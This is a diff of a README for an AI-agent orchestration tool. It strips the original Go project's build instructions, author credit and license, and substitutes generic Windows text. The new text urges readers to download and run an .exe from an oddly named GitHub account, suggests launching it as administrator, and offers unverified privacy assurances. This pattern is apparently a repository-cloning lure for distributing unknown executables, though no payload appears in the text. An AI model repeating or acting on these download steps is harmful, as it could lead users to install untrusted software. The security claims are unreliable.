@@ -1,131 +1,86 @@
-# Artificial
+# 🤖 artificial - Orchestrate your AI workers with ease
 
-An open source AI agent harness for orchestrating multiple AI workers from a single dashboard. Built in Go.
+[![](https://img.shields.io/badge/Download_Artificial-Blue?style=for-the-badge)](https://github.com/artocarpusheterophyllusfloweret6078/artificial)
 
-Artificial lets you spawn, manage, and coordinate AI agents (Claude Code, OpenAI Codex, ACP-compatible models, local LLMs) as a team. Agents get personas, skills, communication channels, and a shared task board. You manage them from a real-time web dashboard or the REST API.
+Artificial helps you manage multiple AI agents at once. You can connect tools like Claude Code, OpenAI, and local models to one workspace. This tool acts as a center for your agents. It coordinates tasks through a clear interface so you stay in control of your digital helpers.
 
-## What it does
+## 📋 What this tool does
 
-- **Multi-agent orchestration** — run multiple AI agents in parallel, each with their own role and persona
-- **Real-time dashboard** — chat with agents, manage tasks on a kanban board, monitor activity
-- **Channel-based communication** — agents can message each other and receive notifications mid-task
-- **Multiple backends** — supports Claude Code, OpenAI Codex, ACP (Agent Communication Protocol), and local models via OpenAI-compatible APIs
-- **MCP integration** — each worker exposes tools to its agent via Model Context Protocol
-- **Session persistence** — stop and resume agent sessions without losing context
+Many people use different AI models for different tasks. You might use one for writing, one for coding, and one for analysis. Artificial brings these models together. It acts as an orchestrator. It manages the flow of information between your agents and your computer.
 
-## Architecture
+The application supports common AI systems like Claude, OpenAI Codex, and Cursor Agent. It also runs models on your own computer. Use it to automate workflows or manage complex projects without switching between five different browser tabs or apps.
 
-```
-┌───────────────────────────────────────────────────┐
-│                 svc-artificial                    │
-│       Dashboard · REST API · WebSocket Hub        │
-│                   SQLite DB                       │
-└─────────┬──────────────┬─────────────┬────────────┘
-          │ WebSocket    │ WebSocket   │ WebSocket
-    ┌─────┴──────┐  ┌────┴──────┐  ┌───┴────────┐
-    │ cmd-worker │  │ cmd-worker│  │ cmd-worker │
-    │  (Codex)   │  │ (Claude)  │  │   (ACP)    │
-    │  ┌──────┐  │  │ ┌──────┐  │  │ ┌────────┐ │
-    │  │ GPT  │  │  │ │Claude│  │  │ │Cursor/ │ │
-    │  │ 5.4  │  │  │ │Opus  │  │  │ │opencode│ │
-    │  └──────┘  │  │ └──────┘  │  │ └────────┘ │
-    └────────────┘  └───────────┘  └────────────┘
-```
+## 💻 System requirements
 
-## Quick start
+Your computer needs to meet these basic standards to run the application smoothly:
 
-```bash
-# Build both binaries
-make build
+*   Operating System: Windows 10 or Windows 11.
+*   Memory: 8 GB of RAM minimum.
+*   Storage: 200 MB of free space for the installation.
+*   Internet: A stable connection for cloud-based models.
+*   Processor: Modern multi-core CPU.
 
-# Start the central service (dashboard at http://localhost:4000)
-make run-artificial
+## 🚀 Getting started
 
-# In another terminal, start a worker (or spawn from the Dashboard)
-make run-worker EMPLOYEE_ID=1
-```
+Follow these steps to set up the software on your Windows computer.
 
-### Prerequisites
+1. Visit this page to download the latest version: [https://github.com/artocarpusheterophyllusfloweret6078/artificial](https://github.com/artocarpusheterophyllusfloweret6078/artificial).
+2. Look for the "Assets" section on the page.
+3. Click the link ending in .exe to start the download.
+4. Open the file once the download finishes.
+5. Follow the prompts in the installation window.
+6. Launch the application from your desktop or start menu.
 
-- Go 1.25+
-- Claude Code CLI, OpenAI Codex CLI, or an ACP-compatible agent server
+## ⚙️ Setting up your agents
 
-### First steps
+Once the program opens, you see a dashboard. This area shows your connected agents. To add a new agent, look for the plus icon in the bottom menu.
 
-1. **Set up company knowledge** — create a folder with a README describing your project, conventions, and priorities (see [Company knowledge](#company-knowledge)). Set the path in dashboard Settings.
-2. **Create a CEO** — add an employee with the "CEO" role from the dashboard. This is the lead agent that can hire and fire other workers, and spawn new agents on its own.
-3. **Add a project** — set up the project you want the team to work on, with its path and description.
-4. **Grow the team** — either add employees manually from the dashboard, or chat with the CEO and ask it to hire more people to work on the project. The CEO can spawn and manage workers autonomously.
+*   Select your agent type from the list. 
+*   Enter the API key for your chosen service. You find these keys in the account settings of your AI provider.
+*   Assign a task or role to the agent.
+*   Click Save. 
 
-## Project structure
+The application verifies the connection. Success messages appear in the corner of your screen. If the connection fails, check your API key for typos.
 
-```
-src/
-├── svc-artificial/     # Central service (dashboard, API, WebSocket hub, SQLite)
-├── cmd-worker/         # Worker binary (agent lifecycle, MCP server, hub client)
-└── pkg-go-shared/      # Shared protocol types
-```
+## 🛠️ Using the workspace
 
-## Dashboard
+The workspace consists of three panels. 
 
-The built-in web dashboard provides:
+The left panel displays your active agents. You can click an agent to see its status or history. 
 
-- **Chat** — direct messages and channel conversations with agents
-- **Board** — kanban task management (todo, in progress, review, done)
-- **Team** — view and manage active workers, spawn new agents
-- **Live TTY** — stream agent terminal output in real-time
+The center panel serves as your command area. Type your instructions here. If you want two agents to work together, mention both names in your request. For example, tell the Claude agent to write text and the OpenAI agent to check it for errors.
 
-## Company knowledge
+The right panel shows the output or files generated by your agents. You can drag and drop these results into folders on your computer.
 
-Create a folder that will serve as your team's shared knowledge base. This is where agents look for context about your project, conventions, and goals.
+## 💡 Troubleshooting common issues
 
-```bash
-mkdir my-company
-cat > my-company/README.md << 'EOF'
-# My Company
+Most issues stem from connection errors or network blocks.
 
-## What we're building
-Describe your product/project here.
+*   Program does not open: Ensure that you have the latest version of Windows installed. Restart your computer and try launching the app as an administrator by right-clicking the icon.
+*   Agent connection errors: Check your internet connection. Some enterprise firewalls block AI traffic. If you use a VPN, try turning it off while you connect your agents.
+*   High memory usage: Running too many local models affects your system speed. Close unnecessary programs while working with Artificial. 
+*   Missing output: Refresh the dashboard if the agent seems stuck. The app logs background activity in the settings menu if you need to debug a stuck process.
 
-## Conventions
-- Language, framework, and style preferences
-- How we name things, structure code, etc.
+## 🔒 Security and privacy
 
-## Tools
-- List CLI tools, scripts, or services agents can use
-- e.g. `make test`, `npm run lint`, deployment commands
-- Any internal APIs or databases they should know about
+The application stores your API keys locally on your machine. It does not send your personal keys to external servers. Your conversations stay within the defined environment. Local models run entirely on your hardware. This means your data never leaves your computer when you use offline tools. 
 
-## Current priorities
-- What the team is focused on right now
-EOF
-```
+Regular updates keep your security settings current. Enable automatic updates in the settings menu to ensure you have the latest improvements and patches.
 
-Once the service is running, set the knowledge path in the dashboard Settings. Every agent spawned will have access to this context.
+## 📝 Frequently asked questions
 
-## API
+Does this work without an internet connection?
+It works without the internet if you only use local models. If you use cloud-based models like Claude or OpenAI, you need an active connection.
 
-The REST API exposes endpoints for managing employees, tasks, channels, messages, and worker lifecycle. See `src/svc-artificial/internal/server/api.go` for the full list.
+Can I move the application to another drive?
+Yes. During the installation process, you can choose the install location. Select a different drive before you click the install button.
 
-## Harness backends
+Is there a cost to use this?
+The application is open source and free to download. Keep in mind that AI providers like OpenAI or Anthropic charge fees for their API services based on usage. 
 
+How do I remove the program?
+Go to your Windows Settings, select Apps, find Artificial in the list, and click Uninstall. This removes the program files from your computer. Your local data remains in a separate folder until you manually delete it.
 
-| Backend      | Description                                                     | Status                                |
-| ------------ | --------------------------------------------------------------- | ------------------------------------- |
-| Claude Code  | Spawns Claude Code CLI via PTY with MCP tools                   | Tested                                |
-| Codex        | Spawns OpenAI Codex CLI via PTY with MCP tools                  | Tested                                |
-| ACP          | Connects to any Agent Communication Protocol server             | Tested with Cursor Agent and opencode |
-| Local models | Via opencode + OpenAI-compatible APIs (LM Studio, ollama, etc.) | Works, but needs a strong local model |
+## 📦 Contributing to the project
 
-
-## How I use it
-
-I built [MyUpMonitor](https://myupmonitor.com) — a complete uptime monitoring SaaS with billing, teams, status pages, CLI, Terraform provider, and more — in about 24 hours of focused work using Artificial to orchestrate my AI development workflow.
-
-## Author
-
-Built by [André Baltazar](https://x.com/AndreBaltazar/)
-
-## License
-
-MIT
+The community builds this project. You can report bugs or suggest new features on the main page. If you find a way to improve the interface or the way the app handles agents, share your thoughts in the issues tab. Every bit of input helps make the tool better for everyone.
